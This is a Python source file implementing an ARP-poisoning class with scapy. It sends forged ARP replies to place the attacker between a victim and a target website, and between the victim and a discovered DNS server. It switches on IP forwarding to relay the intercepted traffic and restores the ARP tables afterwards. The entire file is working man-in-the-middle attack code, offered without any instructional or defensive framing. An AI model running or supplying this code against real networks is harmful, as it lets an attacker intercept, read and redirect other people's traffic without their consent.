import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import logging
import time
import os

class ARPPoison:
    def __init__(self, iface, victimIP, websiteIP):
        self.iface = iface
        self.victimIP = victimIP
        self.websiteIP = websiteIP

        self.dnsIP = None
        self.dnsMAC = None

    def get_mac(self, IP):
        try:
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP)
            pkt = scapy.srp(broadcast, iface=self.iface, timeout=2)[0]
            mac = pkt[0][1].hwsrc
        except IndexError:
            print("[ARPPoison]: Could not find IP or interface. Exiting...")
            exit(1)
        return mac

    def set_mac(self, silent, targets):
        if not silent:
            self.victimMAC = self.get_mac(self.victimIP)
            self.websiteMAC = self.get_mac(self.websiteIP)
        else:
            self.victimMAC = targets[self.victimIP]
            self.websiteMAC = targets[self.websiteIP]

    def set_dns(self, dnsIP):
        if self.dnsIP is None:
            self.dnsIP = dnsIP
            self.dnsMAC = self.get_mac(dnsIP)
            print(f"[ARPPoison]: DNS server discovered at {dnsIP}")

    def poison(self, target, pretend, MAC):
        # Note: Ignore warning when running, adding Ether 'hwdst' will break the poisoning
        packet = Ether(dst=MAC) / ARP(op=2, hwdst=MAC, pdst=target, psrc=pretend)
        scapy.sendp(packet, iface=self.iface)
        print(f"[ARPPoison]: Poisoning {target} as {pretend}")

    def ip_forward(self, enable):
        if enable:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            print("[ARPPoison]: IP forwarding enabled.\n")
        else:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[ARPPoison]: IP forwarding disabled.")

    def restore_tables(self, ptarget1, ptarget2, hwt1, hwt2):
        pkt = Ether(dst=hwt1) / ARP(op=2, pdst=ptarget1, hwdst=hwt1, psrc=ptarget2, hwsrc=hwt2)
        scapy.sendp(pkt, iface=self.iface)
        pkt = Ether(dst=hwt2) / ARP(op=2, pdst=ptarget2, hwdst=hwt2, psrc=ptarget1, hwsrc=hwt1)
        scapy.sendp(pkt, iface=self.iface)

    def attack(self, timer, forward, silent, targets, stop_event):
        self.set_mac(silent, targets)
        if forward:
            self.ip_forward(True)

        while not stop_event.is_set():
            # Victim <--- Attacker ---> Website
            self.poison(self.victimIP, self.websiteIP, self.victimMAC)
            self.poison(self.websiteIP, self.victimIP, self.websiteMAC)

            # Victim <--- Attacker ---> DNS Server (if discovered)
            if self.dnsIP and self.dnsMAC:
                self.poison(self.victimIP, self.dnsIP, self.victimMAC)
                self.poison(self.dnsIP, self.victimIP, self.dnsMAC)

                time.sleep(30.1 - 3*timer)

        if forward:
            self.ip_forward(False)
